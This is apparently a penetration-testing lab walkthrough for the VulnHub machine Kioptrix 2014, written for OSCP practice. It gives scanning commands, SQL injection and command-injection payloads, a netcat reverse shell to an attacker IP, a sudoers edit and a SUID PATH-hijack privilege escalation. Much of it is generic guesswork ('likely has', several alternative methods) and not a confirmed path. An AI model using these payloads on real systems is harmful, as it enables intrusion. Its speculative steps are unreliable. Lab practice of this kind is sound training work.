# Kioptrix 2014 (#5): OSCP Walkthrough

**Machine:** Kioptrix 2014 (#5)  
**Download:** [VulnHub: Kioptrix 2014](https://www.vulnhub.com/entry/kioptrix-2014-5,26/)  
**Difficulty:** Intermediate  
**OS:** Linux (CentOS / FreeBSD-based)  
**Goal:** Obtain `root` access and retrieve the flag  

**Author:** Ankit Patidar (ANKIT48274)

---

## Table of Contents

1. [Reconnaissance & Scanning](#1-reconnaissance--scanning)
2. [Service Enumeration](#2-service-enumeration)
3. [Web Application Analysis](#3-web-application-analysis)
4. [Exploitation: Multiple Web Vulnerabilities](#4-exploitation--multiple-web-vulnerabilities)
5. [Privilege Escalation: Custom Exploit](#5-privilege-escalation--custom-exploit)
6. [Key Takeaways](#6-key-takeaways)
7. [Screenshots](#7-screenshots)

---

## 1. Reconnaissance & Scanning

### Network Discovery

```bash
# Identify target on the local network
sudo netdiscover -r 192.168.1.0/24

# OR
sudo arp-scan --localnet

# OR
nmap -sn 192.168.1.0/24
```

### Full Port Scan

```bash
# Comprehensive port scan
nmap -sS -sV -sC -p- --min-rate=1000 -T4 -oN nmap_initial.txt <TARGET_IP>
```

### Nmap Results

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 5.3 (protocol 2.0)
80/tcp    open  http     Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
443/tcp   open  ssl/http Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
3306/tcp  open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:XX:XX:XX (VMware)
```

**Open Ports:**
| Port | Service | Version | Note |
|------|---------|---------|------|
| 22 | SSH | OpenSSH 5.3 | CentOS version |
| 80 | HTTP | Apache 2.2.15 + PHP 5.3.3 | **Main attack vector** |
| 443 | HTTPS | Apache 2.2.15 + PHP 5.3.3 | Same app via SSL |
| 3306 | MySQL | MySQL | Locked down (unauthorized) |

**Observation:** This machine has the most open ports among the Kioptrix set so far. PHP 5.3.3 suggests multiple known vulnerabilities.

---

## 2. Service Enumeration

### HTTP Service: Port 80

```bash
# Check headers
curl -I http://<TARGET_IP>

# Main page content
curl http://<TARGET_IP>

# WhatWeb identification
whatweb http://<TARGET_IP>

# Directory brute-forcing
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50

# OR
dirb http://<TARGET_IP> /usr/share/wordlists/dirb/common.txt

# Nikto scan for multiple web vulnerabilities
nikto -h http://<TARGET_IP>
```

### SSL Enumeration: Port 443

```bash
# Check SSL configuration
openssl s_client -connect <TARGET_IP>:443 -showcerts

# SSL vulnerability scan
nmap --script ssl-enum-ciphers -p 443 <TARGET_IP>

# Test for SSL/TLS vulnerabilities (Heartbleed, etc.)
sslscan <TARGET_IP>
```

### Directory & File Discovery

```bash
# Gobuster with larger wordlist
gobuster dir -u http://<TARGET_IP> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt -t 50
```

**Interesting directories found:**
```
/images/
/css/
/js/
/phpinfo.php
/test/
/p.php
/mysql/
```

---

## 3. Web Application Analysis

### Step 1: Reviewing Discovered Pages

```bash
# Check phpinfo.php
curl http://<TARGET_IP>/phpinfo.php
# This reveals PHP configuration details

# Check test directory
curl http://<TARGET_IP>/test/

# Check for SQLi test page
curl http://<TARGET_IP>/mysql/
```

The main application appears to be a **custom PHP application** with potential SQL injection, command injection, or file inclusion vulnerabilities.

### Step 2: Identify the Vulnerability Type

The application likely has one or more of the following:
- **SQL injection** in search or parameter-based queries
- **Command injection** in form fields
- **Blind SQL injection**
- **Cross-Site Scripting (XSS)**: though less useful for privesc
- **Authentication bypass**
- **File upload vulnerability**
- **PHP type juggling / loose comparison**

```bash
# Test common injection points
curl "http://<TARGET_IP>/index.php?id=1"
curl "http://<TARGET_IP>/index.php?id=1'"
curl "http://<TARGET_IP>/index.php?page=1"
curl -X POST http://<TARGET_IP>/index.php -d "user=test&pass=test"
```

---

## 4. Exploitation: Multiple Web Vulnerabilities

### Method A: SQL Injection

If the application is vulnerable to SQL injection:

```bash
# Test parameter
curl "http://<TARGET_IP>/index.php?id=1'"

# Check for error-based
curl "http://<TARGET_IP>/index.php?id=1 AND 1=1"
curl "http://<TARGET_IP>/index.php?id=1 AND 1=2"

# Union-based injection
curl "http://<TARGET_IP>/index.php?id=1 UNION SELECT 1,2,3,4-- -"

# Extract data
curl "http://<TARGET_IP>/index.php?id=1 UNION SELECT 1,@@version,user(),4-- -"
```

### Method B: SQL Injection + Local File Inclusion

Some versions of Kioptrix 2014 have a SQL injection that can be used to read files:

```bash
# Using LOAD_FILE() via SQL injection
curl "http://<TARGET_IP>/index.php?id=1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -"

# Read configuration files
curl "http://<TARGET_IP>/index.php?id=1 UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -"
```

### Method C: Authentication Bypass

```bash
# Try common bypass techniques in login forms
curl -X POST http://<TARGET_IP>/login.php \
  -d "username=admin&password=admin"

curl -X POST http://<TARGET_IP>/login.php \
  -d "username=admin' OR '1'='1&password=admin' OR '1'='1"
```

### Method D: Command Injection

Test for command injection in any form fields that might be passed to system functions:

```bash
# Test with ping, traceroute, or hostname lookup features
curl -X POST http://<TARGET_IP>/ping.php \
  -d "ip=127.0.0.1;id"

curl -X POST http://<TARGET_IP>/ping.php \
  -d "ip=127.0.0.1|whoami"
```

### Step 1: Identify the Working Exploit

Through testing, identify which vulnerability works on your specific Kioptrix 2014 instance. Common paths include:

**Path 1: SQL injection in `id` parameter** leading to credential disclosure.
**Path 2: Authentication bypass** on the admin panel.
**Path 3: File upload** in a CMS feature.

### Step 2: Get Initial Shell Access

```bash
# Once you have credentials, SSH into the target
ssh <username>@<TARGET_IP>

# OR get a reverse shell
# 1. Set up listener
nc -lvnp 4444

# 2. Execute payload (via web)
curl -X POST http://<TARGET_IP>/shell.php -d "cmd=nc -e /bin/bash <KALI_IP> 4444"
```

---

## 5. Privilege Escalation

### Step 1: System Enumeration

```bash
# Current user context
whoami
id

# System information
uname -a
cat /etc/redhat-release
cat /etc/*release*

# Check kernel version
uname -r

# Check for sudo rights
sudo -l

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron*
```

### Step 2: Comprehensive Enumeration

```bash
# Automated enumeration script
# Transfer to target and run
wget http://<KALI_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# OR use LinEnum
wget http://<KALI_IP>:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### Step 3: Identify Vulnerable Service/SUID

Based on the enumeration, identify the misconfiguration:

#### Common privesc paths on this machine:

1. **MySQL running as root**: Use MySQL UDF (same as Kioptrix #2)
2. **Custom SUID binary**: Exploit via PATH hijacking
3. **Sudo rights to a command**: Use `sudo -l` output (e.g., sudo for `ht` editor, `nmap`, etc.)
4. **Kernel exploit**: Check for kernel-specific exploits

```bash
# Check running services
ps auxf

# Check network services
netstat -nltup

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Check writable files owned by root
find / -type f -user root -writable 2>/dev/null

# Check for world-writable directories
find / -type d -perm -o+w 2>/dev/null | head -30
```

### Step 4: Execute Privesc: Custom Exploit

#### Option A: MySQL UDF (if MySQL runs as root)

```bash
# Check MySQL user
mysql -u root -p -e "SELECT user(), current_user();"

# If we have root MySQL but can't login via root shell:
# Use credentials from earlier SQL injection
mysql -u <user> -p<password> <database>

# Execute system command via UDF
# (See Kioptrix #2 walkthrough for full MySQL UDF exploitation)
```

#### Option B: Exploit `sudo` Rights

```bash
sudo -l
# Example output:
# User <user> may run the following commands on this host:
#     (root) NOPASSWD: /usr/bin/ht

# If 'ht' editor is available with sudo
sudo ht /etc/shadow
# Inside ht, modify the root password hash

# OR use sudo to edit /etc/sudoers
# Escape to shell from sudo
sudo /usr/bin/ht
# In ht: File -> Open -> /etc/sudoers
# Add: <user> ALL=(ALL) NOPASSWD:ALL
```

#### Option C: Exploit SUID Binary with PATH Hijacking

```bash
# Enumerate SUID binaries
find / -perm -4000 -type f 2>/dev/null

# If you find a custom binary, analyze it
strings <SUID_BINARY>

# Look for relative command calls, then hijack PATH
cd /tmp
echo '#!/bin/bash' > <command>
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> <command>
chmod +x <command>
export PATH=/tmp:$PATH
<SUID_BINARY>
/tmp/rootbash -p
```

#### Option D: Kernel Exploit (if all else fails)

```bash
# Based on kernel version, find a matching exploit
uname -r

# Search on Kali
searchsploit "linux kernel 2.6" centos

# Transfer, compile (or use cross-compiler), and execute
```

### Step 5: Verify Root Access

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

# Read flag
cat /root/flag
cat /root/congrats.txt
```

---

## 6. Key Takeaways

1. **Multiple web vulnerabilities**: This machine combines SQL injection, authentication bypass, and command injection possibilities. Thorough testing of all parameters is essential.
2. **Comprehensive enumeration**: With more ports and services exposed, this machine rewards thorough enumeration (nikto, gobuster, whatweb, nmap scripts).
3. **Privesc via sudo misconfiguration**: The `sudo -l` check is one of the most important enumeration commands. If a command has `NOPASSWD` sudo rights, check GTFOBins for exploitation.
4. **PHP 5.3.3 is dated**: This version of PHP has known vulnerabilities (CVE-2012-1823, CVE-2012-2311) that may help with exploitation.
5. **Custom exploit development**: This machine may require modifying existing exploits rather than using them out of the box.
6. **Defense in depth**: Unlike the earlier Kioptrix machines, this one has MySQL access restricted ("unauthorized" in nmap), making the UDF path less straightforward.
7. **Practice makes perfect**: This machine represents a jump in difficulty from the previous three, simulating a more realistic OSCP-level challenge.

---

## 7. Screenshots

*No screenshots available for this machine.*

---

## Quick Reference: Commands

| Phase | Command |
|-------|---------|
| Discovery | `sudo netdiscover -r 192.168.1.0/24` |
| Nmap Scan | `nmap -sS -sV -sC -p- -T4 -oN scan.txt <TARGET_IP>` |
| Web Tech | `whatweb http://<TARGET_IP>` |
| Dir Buster | `gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50` |
| Nikto | `nikto -h http://<TARGET_IP>` |
| SSL Scan | `nmap --script ssl-enum-ciphers -p 443 <TARGET_IP>` |
| SQLi Test | `curl "http://TARGET/index.php?id=1' UNION SELECT 1,@@version,user(),4-- -"` |
| SQLi LOAD_FILE | `curl "http://TARGET/index.php?id=1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -"` |
| Reverse Shell | `nc -lvnp 4444` |
| SUID Enum | `find / -perm -4000 -type f 2>/dev/null` |
| Sudo Check | `sudo -l` |
| Auto Enum | `wget http://KALI:8000/linpeas.sh && ./linpeas.sh` |
| PATH Hijack | `export PATH=/tmp:\$PATH && <SUID_BINARY>` |

---

## Appendix: Exploit Resources

### GTFOBins (sudo/privesc reference)
```
https://gtfobins.github.io/
```
Always check GTFOBins for any binary you have sudo rights to use.

### Common Exploit Search Commands

```bash
searchsploit apache 2.2.15
searchsploit php 5.3.3
searchsploit mysql udf
searchsploit centos kernel privesc
```

---

*M4d3 w1th ❤️ by Ankit Patidar*
